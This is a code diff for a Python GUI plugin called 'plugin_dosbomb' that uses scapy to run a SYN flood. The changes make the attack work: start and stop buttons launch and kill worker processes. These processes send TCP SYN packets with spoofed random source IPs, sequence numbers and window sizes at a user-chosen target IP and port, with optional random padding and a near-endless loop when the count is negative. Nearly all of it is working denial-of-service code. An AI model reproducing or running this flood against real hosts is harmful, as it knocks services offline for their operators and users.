@@ -15,7 +15,8 @@ except ImportError:
 
 from scapy.all import *
 from random import randint
-import configparser
+import configparser,string
+import multiprocessing
 
 
 class plugin_dosbomb:
@@ -24,6 +25,9 @@ class plugin_dosbomb:
 
 	plugin_data = dict(config.items('plugin'))
 	run = False
+	run_task = []
+
+
 
 	#IP enter gadget
 	class iPentry(tk.Widget):
@@ -40,8 +44,20 @@ class plugin_dosbomb:
 		myip = self.enterIp.get()
 		#print(f"myip is {myip}")
 
-	def process(self):
-		print("Loaded Syn_Flooder")
+	def suspend(self):
+		print("Suspend Synflooder process")
+		if len(self.run_task) > 0:
+			for x in range(0,len(self.run_task)):
+				if self.run_task[x].is_alive():
+					self.run_task[x].terminate()
+
+	def start(self):
+		print("Start Synflooder")
+		ip = self.enterIp.get()
+		self.run_task.append(multiprocessing.Process(target=self.SYN_Flood, args=('.'.join(map(str, list(ip))), int(self.Spinbox1.get()), int(self.Spinbox1_1.get()),int(self.Spinbox1_2.get()),)))
+		self.run_task[len(self.run_task)-1].start()
+		
+		
 
 	def gui(self,guihandl):
 		guihandl['root'].tk.call('package','require','ipentry')
@@ -152,7 +168,7 @@ class plugin_dosbomb:
 		self.Spinbox1_2.configure(insertbackground="black")
 		self.Spinbox1_2.configure(selectbackground="blue")
 		self.Spinbox1_2.configure(selectforeground="white")
-		var_dummy3.set(1024)
+		var_dummy3.set(0)
 
 		self.Button1 = tk.Button(self.PNotebook1_t5,command=self.start_proc)
 		self.Button1.place(relx=0.054, rely=0.793, height=33, width=96)
@@ -185,33 +201,37 @@ class plugin_dosbomb:
 		self.Button1_3.configure(state="normal")
 		self.Button1.configure(state="disabled")
 		self.run = True
+		self.start()
 
 	def stop_proc(self):
 		self.Button1_3.configure(state="disabled")
 		self.Button1.configure(state="normal")
 		self.run = False
+		self.suspend()
 
-	def randomIP():
+	def randomIP(self):
 		ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
 		return ip
 
 
-	def randInt():
+	def randInt(self):
 		x = randint(1000, 9000)
 		return x
 
 
-	def SYN_Flood(dstIP, dstPort, counter,s_port,s_eq,w_indow,bysiz = 1024):
+	def SYN_Flood(self,dstIP, dstPort, counter,bysiz = 0):
 		total = 0
+		if counter < 0 :
+			counter = 10**10
 		print ("Packets are sending ...")
 
 		for x in range (0, counter):
-			s_port = randInt()
-			s_eq = randInt()
-			w_indow = randInt()
+			s_port = self.randInt()
+			s_eq = self.randInt()
+			w_indow = self.randInt()
 
 			IP_Packet = IP ()
-			IP_Packet.src = randomIP()
+			IP_Packet.src = self.randomIP()
 			IP_Packet.dst = dstIP
 
 			TCP_Packet = TCP ()
@@ -221,12 +241,16 @@ class plugin_dosbomb:
 			TCP_Packet.seq = s_eq
 			TCP_Packet.window = w_indow
 
-			send(IP_Packet/TCP_Packet/Raw(Fillbytes(bysiz)), verbose=0)
+			if not bysiz == 0 :
+				send(IP_Packet/TCP_Packet/Raw(self.Fillbytes(bysiz)), verbose=0)
+			else :
+				send(IP_Packet/TCP_Packet,verbose=0)
+
 			total+=1
 
-		stdout.write("\nTotal packets sent: %i\n" % total)
+		
 
-	def Fillbytes(size):
+	def Fillbytes(self,size):
 		res = ''.join(random.choices(string.ascii_uppercase +string.digits, k = size))
 		return res
 
